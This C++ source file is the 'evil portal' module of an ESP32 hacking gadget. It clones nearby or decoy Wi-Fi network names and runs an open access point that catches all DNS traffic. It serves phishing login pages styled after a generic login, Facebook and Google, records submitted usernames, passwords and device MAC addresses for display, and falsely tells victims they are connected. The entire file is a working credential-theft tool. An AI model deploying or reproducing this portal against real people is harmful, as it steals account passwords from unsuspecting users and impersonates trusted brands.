/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/jbohack/nyanBOX
   ________________________________________ */

#include "../include/evil_portal.h"
#include "../include/sleep_manager.h"
#include "../include/pindefs.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

enum EvilPortalState { 
    PORTAL_MENU, 
    PORTAL_RUNNING,
    PORTAL_VIEW_CREDS
};

static EvilPortalState currentState = PORTAL_MENU;
static int menuSelection = 0;
static int credIndex = 0;

struct Credential {
    String ssid;
    String username;
    String password;
    String macAddress;
    unsigned long captureTime;
};

static std::vector<Credential> capturedCreds;
static String currentSSID = "Free WiFi";
static int connectedClients = 0;
static int totalVisitors = 0;

static std::vector<String> scannedSSIDs;
static int currentSSIDIndex = 0;
static bool scanCompleted = false;
static unsigned long lastScanTime = 0;
static unsigned long menuEnterTime = 0;
static const unsigned long SCAN_INTERVAL = 60000;

const char* customSSIDs[] = {
    "Free WiFi", "Guest", "Hotel WiFi", "Airport WiFi",
    "Starbucks", "McDonald's WiFi", "Public WiFi", "Open Network"
};
const int customSSIDCount = sizeof(customSSIDs) / sizeof(customSSIDs[0]);

WebServer portalServer(80);
DNSServer portalDNS;
const byte DNS_PORT = 53;

const char* loginPortalHTML = R"(
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; color: #333; margin-bottom: 30px; }
        input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        input[type=submit] { width: 100%; background: #4CAF50; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        input[type=submit]:hover { background: #45a049; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h2>WiFi Network Login</h2>
        <p>Please enter your credentials to access the internet:</p>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Connect">
        </form>
        <div class="footer">Secure Connection</div>
    </div>
</body>
</html>
)";

const char* facebookPortalHTML = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Facebook WiFi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; margin: 0; padding: 20px; background: #3b5998; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #3b5998; font-size: 28px; margin: 0; }
        input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        input[type=submit] { width: 100%; background: #3b5998; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
        </div>
        <p>Log in to Facebook to continue to WiFi</p>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Log In">
        </form>
        <div class="footer">Facebook WiFi powered by Facebook</div>
    </div>
</body>
</html>
)";

const char* googlePortalHTML = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Google WiFi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Roboto', Arial; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #4285f4; font-size: 24px; margin: 0; }
        h2 { text-align: center; font-weight: 400; color: #333; }
        input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        input[type=submit] { width: 100%; background: #4285f4; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Google</h1>
        </div>
        <h2>Sign in to WiFi</h2>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Next">
        </form>
        <div class="footer">Google WiFi</div>
    </div>
</body>
</html>
)";

static int currentTemplate = 0;
static const char* portalTemplates[] = {
    loginPortalHTML,
    facebookPortalHTML,
    googlePortalHTML
};
static const char* templateNames[] = {
    "Generic Login",
    "Facebook WiFi",
    "Google WiFi"
};
static const int numTemplates = 3;

void handleCaptivePortal() {
    portalServer.send(200, "text/html", portalTemplates[currentTemplate]);
    totalVisitors++;
}

void handleLogin() {
    String username = portalServer.arg("username");
    String password = portalServer.arg("password");
    
    if (username.length() > 0 && password.length() > 0) {
        Credential newCred;
        newCred.ssid = currentSSID;
        newCred.username = username;
        newCred.password = password;

        String macAddr = "Unknown";
        wifi_sta_list_t stationList;
        esp_err_t err = esp_wifi_ap_get_sta_list(&stationList);

        if (err == ESP_OK && stationList.num > 0) {
            if (stationList.num == 1) {
                char macStr[18];
                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    stationList.sta[0].mac[0], stationList.sta[0].mac[1],
                    stationList.sta[0].mac[2], stationList.sta[0].mac[3],
                    stationList.sta[0].mac[4], stationList.sta[0].mac[5]);
                macAddr = String(macStr);
            } else {
                char macStr[18];
                int lastIdx = stationList.num - 1;
                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                    stationList.sta[lastIdx].mac[0], stationList.sta[lastIdx].mac[1],
                    stationList.sta[lastIdx].mac[2], stationList.sta[lastIdx].mac[3],
                    stationList.sta[lastIdx].mac[4], stationList.sta[lastIdx].mac[5]);
                macAddr = String(macStr);
            }
        }

        newCred.macAddress = macAddr;
        newCred.captureTime = millis();

        capturedCreds.push_back(newCred);
    }
    portalServer.send(200, "text/html",
        "<html><body style='font-family:Arial;text-align:center;padding:50px;'>"
        "<h2>Connected Successfully!</h2>"
        "<p>You are now connected to the internet.</p>"
        "<p>Thank you for using our WiFi service.</p>"
        "</body></html>");
}

void setupPortalAP() {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(currentSSID.c_str(), "");
    portalDNS.start(DNS_PORT, "*", WiFi.softAPIP());
    portalServer.onNotFound(handleCaptivePortal);
    portalServer.on("/", handleCaptivePortal);
    portalServer.on("/login", HTTP_POST, handleLogin);
    portalServer.on("/generate_204", handleCaptivePortal);  // Android
    portalServer.on("/hotspot-detect.html", handleCaptivePortal);  // iOS
    portalServer.on("/connecttest.txt", handleCaptivePortal);  // Windows
    portalServer.on("/redirect", handleCaptivePortal);  // Windows
    
    portalServer.begin();
    
}

void stopPortalAP() {
    portalServer.stop();
    portalDNS.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    
}

void scanForNetworks() {
    scanCompleted = false;
    scannedSSIDs.clear();
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Scanning WiFi...");
    u8g2.drawStr(0, 22, "Please wait");
    u8g2.sendBuffer();
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int networksFound = WiFi.scanNetworks();
    int actualScannedCount = 0;
    
    for (int i = 0; i < networksFound && scannedSSIDs.size() < 92; i++) {
        String ssid = WiFi.SSID(i);
        if (ssid.length() > 0) {
            bool exists = false;
            for (const String& existingSSID : scannedSSIDs) {
                if (existingSSID == ssid) {
                    exists = true;
                    break;
                }
            }
            if (!exists) {
                scannedSSIDs.push_back(ssid);
                actualScannedCount++;
            }
        }
    }
    
    for (int i = 0; i < customSSIDCount && scannedSSIDs.size() < 100; i++) {
        scannedSSIDs.push_back(String(customSSIDs[i]));
    }
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Scan Complete");
    char countStr[32];
    snprintf(countStr, sizeof(countStr), "Found %d networks", actualScannedCount);
    u8g2.drawStr(0, 22, countStr);
    u8g2.sendBuffer();
    delay(1000);
    
    scanCompleted = true;
    lastScanTime = millis();
}

void checkAutoScan() {
    if (currentState == PORTAL_MENU && menuEnterTime > 0 && (millis() - menuEnterTime >= SCAN_INTERVAL)) {
        scanForNetworks();
        menuEnterTime = millis();
    }
}

void drawPortalMenu() {
    u8g2.clearBuffer();
    
    const char* menuItems[] = {
        "Start Portal",
        "Change Template", 
        "Change SSID",
        "View Captured"
    };
    
    for (int i = 0; i < 4; i++) {
        char itemStr[32];
        bool selected = (menuSelection == i);
        
        if (i == 1) {
            snprintf(itemStr, sizeof(itemStr), "%s %s",
                    selected ? ">" : " ", templateNames[currentTemplate]);
        } else if (i == 2) {
            char truncatedSSID[16];
            if (currentSSID.length() > 12) {
                strncpy(truncatedSSID, currentSSID.c_str(), 12);
                truncatedSSID[12] = '\0';
                strcat(truncatedSSID, "..");
            } else {
                strcpy(truncatedSSID, currentSSID.c_str());
            }
            snprintf(itemStr, sizeof(itemStr), "%s SSID: %s",
                    selected ? ">" : " ", truncatedSSID);
        } else if (i == 3) {
            snprintf(itemStr, sizeof(itemStr), "%s %s (%d)",
                    selected ? ">" : " ", menuItems[i], (int)capturedCreds.size());
        } else {
            snprintf(itemStr, sizeof(itemStr), "%s %s",
                    selected ? ">" : " ", menuItems[i]);
        }
        
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 12 + (i * 10), itemStr);
    }
    
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "U/D=NAV R=OK SEL=EXIT");
    u8g2.sendBuffer();
}

void drawPortalStatus() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Portal Running");
    char ssidStr[22];
    if (currentSSID.length() > 18) {
        strncpy(ssidStr, currentSSID.c_str(), 16);
        ssidStr[16] = '\0';
        strcat(ssidStr, "..");
    } else {
        strcpy(ssidStr, currentSSID.c_str());
    }
    u8g2.drawStr(0, 22, ssidStr);
    char templateStr[22];
    if (strlen(templateNames[currentTemplate]) > 18) {
        strncpy(templateStr, templateNames[currentTemplate], 16);
        templateStr[16] = '\0';
        strcat(templateStr, "..");
    } else {
        strcpy(templateStr, templateNames[currentTemplate]);
    }
    u8g2.drawStr(0, 34, templateStr);
    connectedClients = WiFi.softAPgetStationNum();
    char statsStr[32];
    snprintf(statsStr, sizeof(statsStr), "Clients:%d Visits:%d", connectedClients, totalVisitors);
    u8g2.drawStr(0, 46, statsStr);
    
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "L=Stop SEL=EXIT");
    u8g2.sendBuffer();
}

void drawCredentialsList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    
    if (capturedCreds.empty()) {
        u8g2.drawStr(0, 10, "No Credentials");
        u8g2.drawStr(0, 22, "Captured Yet");
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "L=Back SEL=EXIT");
    } else {
        const Credential& cred = capturedCreds[credIndex];

        char ssidStr[22];
        if (cred.ssid.length() > 20) {
            strncpy(ssidStr, cred.ssid.c_str(), 18);
            ssidStr[18] = '\0';
            strcat(ssidStr, "..");
        } else {
            strcpy(ssidStr, cred.ssid.c_str());
        }
        u8g2.drawStr(0, 10, "Net:");
        u8g2.drawStr(25, 10, ssidStr);

        char macStr[18];
        if (cred.macAddress.length() > 17) {
            strncpy(macStr, cred.macAddress.c_str(), 17);
            macStr[17] = '\0';
        } else {
            strcpy(macStr, cred.macAddress.c_str());
        }
        u8g2.drawStr(0, 20, "MAC:");
        u8g2.drawStr(25, 20, macStr);

        char userStr[22];
        if (cred.username.length() > 20) {
            strncpy(userStr, cred.username.c_str(), 18);
            userStr[18] = '\0';
            strcat(userStr, "..");
        } else {
            strcpy(userStr, cred.username.c_str());
        }
        u8g2.drawStr(0, 30, "User:");
        u8g2.drawStr(30, 30, userStr);

        char passStr[22];
        if (cred.password.length() > 20) {
            strncpy(passStr, cred.password.c_str(), 18);
            passStr[18] = '\0';
            strcat(passStr, "..");
        } else {
            strcpy(passStr, cred.password.c_str());
        }
        u8g2.drawStr(0, 40, "Pass:");
        u8g2.drawStr(30, 40, passStr);

        char infoStr[32];
        unsigned long currentTime = millis();
        unsigned long elapsedMs = currentTime - cred.captureTime;
        unsigned long elapsedMinutes = elapsedMs / 60000;
        snprintf(infoStr, sizeof(infoStr), "%d/%d - %lum ago",
                credIndex + 1, (int)capturedCreds.size(), elapsedMinutes);
        u8g2.drawStr(0, 50, infoStr);

        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "U/D=Nav L=Back SEL=EXIT");
    }
    
    u8g2.sendBuffer();
}

void evilPortalSetup() {
    currentState = PORTAL_MENU;
    menuSelection = 0;
    credIndex = 0;
    totalVisitors = 0;
    connectedClients = 0;
    currentSSIDIndex = 0;
    menuEnterTime = millis();
    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
    scanForNetworks();
    if (!scannedSSIDs.empty()) {
        currentSSID = scannedSSIDs[0];
    }
}

void evilPortalLoop() {
    checkAutoScan();
    
    static bool upPressed = false, downPressed = false;
    static bool rightPressed = false, leftPressed = false;
    bool upNow = digitalRead(BUTTON_PIN_UP) == LOW;
    bool downNow = digitalRead(BUTTON_PIN_DOWN) == LOW;
    bool rightNow = digitalRead(BUTTON_PIN_RIGHT) == LOW;
    bool leftNow = digitalRead(BUTTON_PIN_LEFT) == LOW;

    switch (currentState) {
        case PORTAL_MENU:
            if (upNow && !upPressed) {
                menuSelection = (menuSelection - 1 + 4) % 4;
                delay(200);
            }
            if (downNow && !downPressed) {
                menuSelection = (menuSelection + 1) % 4;
                delay(200);
            }
            if (rightNow && !rightPressed) {
                switch (menuSelection) {
                    case 0:
                        setupPortalAP();
                        currentState = PORTAL_RUNNING;
                        break;
                    case 1:
                        currentTemplate = (currentTemplate + 1) % numTemplates;
                        break;
                    case 2:
                        if (!scannedSSIDs.empty()) {
                            currentSSIDIndex = (currentSSIDIndex + 1) % scannedSSIDs.size();
                            currentSSID = scannedSSIDs[currentSSIDIndex];
                        } else {
                            static int ssidIndex = 0;
                            ssidIndex = (ssidIndex + 1) % customSSIDCount;
                            currentSSID = String(customSSIDs[ssidIndex]);
                        }
                        break;
                    case 3:
                        currentState = PORTAL_VIEW_CREDS;
                        credIndex = 0;
                        break;
                }
                delay(200);
            }
            drawPortalMenu();
            break;
            
        case PORTAL_RUNNING:
            if (leftNow && !leftPressed) {
                stopPortalAP();
                currentState = PORTAL_MENU;
                menuEnterTime = millis();
                delay(200);
            }
            portalDNS.processNextRequest();
            portalServer.handleClient();
            
            drawPortalStatus();
            break;
            
        case PORTAL_VIEW_CREDS:
            if (upNow && !upPressed && !capturedCreds.empty()) {
                credIndex = (credIndex - 1 + capturedCreds.size()) % capturedCreds.size();
                delay(200);
            }
            if (downNow && !downPressed && !capturedCreds.empty()) {
                credIndex = (credIndex + 1) % capturedCreds.size();
                delay(200);
            }
            if (leftNow && !leftPressed) {
                currentState = PORTAL_MENU;
                menuEnterTime = millis();
                delay(200);
            }
            drawCredentialsList();
            break;
    }
    upPressed = upNow;
    downPressed = downNow;
    rightPressed = rightNow;
    leftPressed = leftNow;
}